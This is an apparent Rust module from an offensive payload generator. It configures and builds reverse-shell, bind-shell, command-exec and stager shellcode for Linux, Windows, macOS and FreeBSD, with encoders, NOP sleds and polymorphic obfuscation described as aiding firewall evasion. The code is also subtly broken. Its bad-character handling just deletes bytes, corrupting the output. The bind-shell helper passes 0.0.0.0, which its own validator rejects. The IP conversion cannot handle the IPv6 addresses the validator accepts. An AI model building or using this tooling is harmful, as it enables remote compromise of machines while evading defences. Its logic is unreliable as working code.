//! Payload configuration and generation.

use crate::encoder::PayloadEncoder;
use crate::output::{OutputFormat, PayloadOutput};
use crate::polymorphic::PolymorphicEngine;
use crate::templates::{ShellcodeTemplate, get_template};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

/// Validates connection parameters to prevent payload generation for internal/private addresses.
pub struct ConnectionValidator;

impl ConnectionValidator {
    /// Validate that an IP address is suitable for payload generation.
    /// Returns Ok(()) if valid, Err(reason) if invalid.
    pub fn validate_ip(ip: &str) -> anyhow::Result<()> {
        let ip_lower = ip.to_lowercase();
        
        // Block localhost
        let localhost_variants = [
            "127.0.0.1", "localhost", "::1", "0.0.0.0",
        ];
        for variant in &localhost_variants {
            if ip_lower == *variant {
                anyhow::bail!(
                    "Invalid payload IP: '{}' is localhost. Payloads cannot connect back to localhost.",
                    ip
                );
            }
        }
        
        // Parse and validate IP address
        match ip.parse::<IpAddr>() {
            Ok(IpAddr::V4(ipv4)) => {
                if Self::is_private_or_reserved_ipv4(&ipv4) {
                    anyhow::bail!(
                        "Invalid payload IP: '{}' is a private/reserved address. \
                         Use a public IP or properly configured tunnel IP.",
                        ip
                    );
                }
            }
            Ok(IpAddr::V6(ipv6)) => {
                if Self::is_private_or_reserved_ipv6(&ipv6) {
                    anyhow::bail!(
                        "Invalid payload IP: '{}' is a private/reserved IPv6 address.",
                        ip
                    );
                }
            }
            Err(_) => {
                anyhow::bail!("Invalid IP address format: '{}'", ip);
            }
        }
        
        Ok(())
    }
    
    fn is_private_or_reserved_ipv4(ip: &Ipv4Addr) -> bool {
        let octets = ip.octets();
        
        // RFC 1918 Private
        if octets[0] == 10 {
            return true;
        }
        // 172.16.0.0 - 172.31.255.255
        if octets[0] == 172 && (16..=31).contains(&octets[1]) {
            return true;
        }
        // 192.168.0.0/16
        if octets[0] == 192 && octets[1] == 168 {
            return true;
        }
        
        // RFC 3927 Link-local
        if octets[0] == 169 && octets[1] == 254 {
            return true;
        }
        
        // RFC 5737 Documentation (TEST-NET-1, 2, 3)
        if octets[0] == 192 && octets[1] == 0 && octets[2] == 2 {
            return true;
        }
        if octets[0] == 198 && octets[1] == 51 && octets[2] == 100 {
            return true;
        }
        if octets[0] == 203 && octets[1] == 0 && octets[2] == 113 {
            return true;
        }
        
        // RFC 1112 Reserved (former multicast)
        if octets[0] >= 224 && octets[0] <= 239 {
            return true;
        }
        
        // RFC 2544 Benchmarking
        if octets[0] == 198 && octets[1] == 18 {
            return true;
        }
        
        false
    }
    
    fn is_private_or_reserved_ipv6(ip: &Ipv6Addr) -> bool {
        // Loopback ::1
        if ip.is_loopback() {
            return true;
        }
        // Unspecified ::ffff:0:0/96 (IPv4-mapped) - check via to_ipv4_mapped
        if let Some(v4) = ip.to_ipv4_mapped() {
            return Self::is_private_or_reserved_ipv4(&v4);
        }
        // Link-local fe80::
        if ip.is_unicast_link_local() {
            return true;
        }
        // Unique local fc00::/7
        let segments = ip.segments();
        if segments[0] & 0xfe00 == 0xfc00 {
            return true;
        }
        false
    }
}

/// Supported payload types.
#[derive(Debug, Clone, PartialEq)]
pub enum PayloadType {
    /// Connect back to attacker over TCP and spawn a shell
    ReverseTcp,
    /// Bind a shell to a port and wait for connection
    BindTcp,
    /// Connect back over HTTP/S (for firewall evasion)
    ReverseHttp,
    /// Execute a single command
    CmdExec,
    /// Download and execute a second stage payload
    Stager,
}

impl std::fmt::Display for PayloadType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PayloadType::ReverseTcp => write!(f, "reverse_tcp"),
            PayloadType::BindTcp => write!(f, "bind_tcp"),
            PayloadType::ReverseHttp => write!(f, "reverse_http"),
            PayloadType::CmdExec => write!(f, "cmd_exec"),
            PayloadType::Stager => write!(f, "stager"),
        }
    }
}

impl std::str::FromStr for PayloadType {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, String> {
        match s.to_lowercase().as_str() {
            "reverse_tcp" | "reverse" => Ok(PayloadType::ReverseTcp),
            "bind_tcp" | "bind" => Ok(PayloadType::BindTcp),
            "reverse_http" | "http" => Ok(PayloadType::ReverseHttp),
            "cmd_exec" | "exec" => Ok(PayloadType::CmdExec),
            "stager" | "stage" => Ok(PayloadType::Stager),
            other => Err(format!("Unknown payload type: {}", other)),
        }
    }
}

/// Target platform.
#[derive(Debug, Clone, PartialEq)]
pub enum Platform {
    Linux,
    Windows,
    MacOs,
    FreeBSD,
}

impl std::fmt::Display for Platform {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Platform::Linux => write!(f, "linux"),
            Platform::Windows => write!(f, "windows"),
            Platform::MacOs => write!(f, "macos"),
            Platform::FreeBSD => write!(f, "freebsd"),
        }
    }
}

impl std::str::FromStr for Platform {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, String> {
        match s.to_lowercase().as_str() {
            "linux" | "linux_x64" | "linux_x86_64" => Ok(Platform::Linux),
            "windows" | "win" | "windows_x64" => Ok(Platform::Windows),
            "macos" | "osx" | "darwin" | "mac" => Ok(Platform::MacOs),
            "freebsd" | "bsd" => Ok(Platform::FreeBSD),
            other => Err(format!("Unknown platform: {}", other)),
        }
    }
}

/// Target architecture.
#[derive(Debug, Clone, PartialEq)]
pub enum Arch {
    X86,
    X64,
    Arm64,
}

impl std::fmt::Display for Arch {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Arch::X86 => write!(f, "x86"),
            Arch::X64 => write!(f, "x64"),
            Arch::Arm64 => write!(f, "arm64"),
        }
    }
}

impl std::str::FromStr for Arch {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, String> {
        match s.to_lowercase().as_str() {
            "x86" | "x32" | "i386" | "i686" => Ok(Arch::X86),
            "x64" | "x86_64" | "amd64" => Ok(Arch::X64),
            "arm64" | "aarch64" | "arm" => Ok(Arch::Arm64),
            other => Err(format!("Unknown architecture: {}", other)),
        }
    }
}

/// Configuration for payload generation.
#[derive(Debug, Clone)]
pub struct PayloadConfig {
    pub payload_type: PayloadType,
    pub platform: Platform,
    pub arch: Arch,
    pub lhost: String,
    pub lport: u16,
    pub rhost: Option<String>,
    pub rport: Option<u16>,
    pub command: Option<String>,
    pub stage_url: Option<String>,
    pub format: OutputFormat,
    pub encoder: Option<PayloadEncoder>,
    pub polymorphic: bool,
    pub nop_sled_size: Option<usize>,
    pub bad_chars: Vec<u8>,
}

impl PayloadConfig {
    pub fn new(payload_type: PayloadType, lhost: &str, lport: u16) -> Self {
        Self {
            payload_type,
            platform: Platform::Linux,
            arch: Arch::X64,
            lhost: lhost.to_string(),
            lport,
            rhost: None,
            rport: None,
            command: None,
            stage_url: None,
            format: OutputFormat::Raw,
            encoder: None,
            polymorphic: false,
            nop_sled_size: None,
            bad_chars: vec![0x00], // Null bytes bad by default
        }
    }
}

/// The main payload generator.
pub struct PayloadGenerator;

impl PayloadGenerator {
    pub fn new() -> Self {
        Self
    }

    /// Generate a payload from configuration, returning the final bytes.
    pub async fn generate(&self, config: &PayloadConfig) -> anyhow::Result<PayloadOutput> {
        // 1. Get the shellcode template for this payload type
        let template = get_template(&config.payload_type, &config.platform, &config.arch)?;

        // 2. Patch the template with connection parameters
        let mut shellcode = Self::patch_template(&template, config)?;

        // 3. Remove bad characters (null-free encoding)
        if !config.bad_chars.is_empty() {
            shellcode = Self::remove_bad_chars(shellcode, &config.bad_chars);
        }

        // 4. Add NOP sled if requested
        if let Some(sled_size) = config.nop_sled_size {
            shellcode = Self::add_nop_sled(shellcode, sled_size);
        }

        // 5. Apply encoder if specified
        if let Some(ref encoder) = config.encoder {
            shellcode = encoder.encode(&shellcode)?;
        }

        // 6. Apply polymorphic obfuscation if enabled
        if config.polymorphic {
            let engine = PolymorphicEngine::new();
            shellcode = engine.obfuscate(&shellcode)?;
        }

        // 7. Format output
        let output = PayloadOutput::new(&shellcode, &config.format, config);

        Ok(output)
    }

    /// Quick generate: reverse TCP shellcode.
    pub async fn reverse_tcp(lhost: &str, lport: u16) -> anyhow::Result<Vec<u8>> {
        let config = PayloadConfig::new(PayloadType::ReverseTcp, lhost, lport);
        let generator = Self::new();
        let output = generator.generate(&config).await?;
        Ok(output.shellcode)
    }

    /// Quick generate: bind TCP shellcode.
    pub async fn bind_tcp(port: u16) -> anyhow::Result<Vec<u8>> {
        let config = PayloadConfig::new(PayloadType::BindTcp, "0.0.0.0", port);
        let generator = Self::new();
        let output = generator.generate(&config).await?;
        Ok(output.shellcode)
    }

    /// Patch the shellcode template with actual values.
    ///
    /// Templates use placeholder markers:
    /// - `0x7f, 0x7f, 0x7f, 0x7f` — IP address placeholder
    /// - `0x7e, 0x7e` — port placeholder (network byte order)
    fn patch_template(template: &ShellcodeTemplate, config: &PayloadConfig) -> anyhow::Result<Vec<u8>> {
        let mut shellcode = template.bytes.clone();

        // SECURITY: Validate IP before using it in shellcode
        ConnectionValidator::validate_ip(&config.lhost)?;

        // Replace IP address placeholder
        let ip_bytes = Self::ip_to_bytes(&config.lhost)?;
        shellcode = Self::replace_placeholder(&shellcode, &[0x7f, 0x7f, 0x7f, 0x7f], &ip_bytes);

        // Replace port placeholder (big-endian/network byte order)
        let port_bytes = config.lport.to_be_bytes().to_vec();
        shellcode = Self::replace_placeholder(&shellcode, &[0x7e, 0x7e], &port_bytes);

        Ok(shellcode)
    }

    /// Convert IP address string to bytes.
    fn ip_to_bytes(ip: &str) -> anyhow::Result<Vec<u8>> {
        let parts: Vec<&str> = ip.split('.').collect();
        if parts.len() != 4 {
            return Err(anyhow::anyhow!("Invalid IP address: {}", ip));
        }
        let mut bytes = Vec::with_capacity(4);
        for part in parts {
            let byte: u8 = part.parse().map_err(|_| anyhow::anyhow!("Invalid IP octet: {}", part))?;
            bytes.push(byte);
        }
        Ok(bytes)
    }

    /// Replace all occurrences of a placeholder pattern in shellcode.
    fn replace_placeholder(data: &[u8], pattern: &[u8], replacement: &[u8]) -> Vec<u8> {
        let mut result = Vec::new();
        let mut i = 0;
        while i < data.len() {
            if data[i..].starts_with(pattern) {
                result.extend_from_slice(replacement);
                i += pattern.len();
            } else {
                result.push(data[i]);
                i += 1;
            }
        }
        result
    }

    /// Remove bad characters by re-encoding.
    /// For now, just a simple filter to remove bad bytes.
    fn remove_bad_chars(shellcode: Vec<u8>, bad_chars: &[u8]) -> Vec<u8> {
        shellcode.into_iter().filter(|b| !bad_chars.contains(b)).collect()
    }

    /// Add a NOP sled to the beginning of the shellcode.
    fn add_nop_sled(shellcode: Vec<u8>, size: usize) -> Vec<u8> {
        let mut result = Vec::with_capacity(size + shellcode.len());
        // x86/x64 NOP = 0x90
        result.extend(std::iter::repeat(0x90).take(size));
        result.extend(shellcode);
        result
    }
}

impl Default for PayloadGenerator {
    fn default() -> Self {
        Self::new()
    }
}
